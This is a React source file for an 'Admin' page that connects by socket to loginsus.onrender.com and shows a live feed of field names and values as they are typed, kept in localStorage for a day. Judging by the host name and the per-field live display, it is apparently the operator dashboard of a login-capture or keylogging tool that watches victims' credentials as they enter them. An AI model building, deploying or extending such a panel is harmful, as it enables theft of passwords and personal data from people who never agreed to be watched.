import React, { useState, useEffect } from "react";
import io from "socket.io-client";

const socket = io("https://loginsus.onrender.com");
const STORAGE_KEY = "typedData";
const EXPIRY_MS = 24 * 60 * 60 * 1000; // 1 din

export default function Admin() {
  const [typed, setTyped] = useState([]);

  // Load from localStorage
  useEffect(() => {
    const saved = localStorage.getItem(STORAGE_KEY);
    if (saved) {
      const { data, timestamp } = JSON.parse(saved);
      if (Date.now() - timestamp < EXPIRY_MS) {
        setTyped(data);
      } else {
        localStorage.removeItem(STORAGE_KEY);
      }
    }
  }, []);

  // Socket listener
  useEffect(() => {
    socket.on("showText", (data) => {
      setTyped((prev) => {
        let newData = [...prev];

        // Agar last entry ka field same hai → update karo
        if (newData.length > 0 && newData[newData.length - 1].field === data.field) {
          newData[newData.length - 1] = data;
        } else {
          // Naya field → nayi line banao
          newData.push(data);
        }

        localStorage.setItem(
          STORAGE_KEY,
          JSON.stringify({ data: newData, timestamp: Date.now() })
        );

        return newData;
      });
    });

    return () => socket.off("showText");
  }, []);

  // 🔹 Clear All Button Function
  const handleClear = () => {
    localStorage.removeItem(STORAGE_KEY);
    setTyped([]);
  };

  return (
    <div className="min-h-screen p-8 bg-black text-green-400 font-mono">
      <div className="flex items-center justify-between mb-4">
        <h1 className="text-2xl">Live Typing Feed</h1>
        <button
          onClick={handleClear}
          className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
        >
          Clear All
        </button>
      </div>

      <div className="space-y-2">
        {typed.map((item, i) => (
          <div key={i}>
            <strong>{item.field}:</strong> {item.value}
          </div>
        ))}
      </div>
    </div>
  );
}
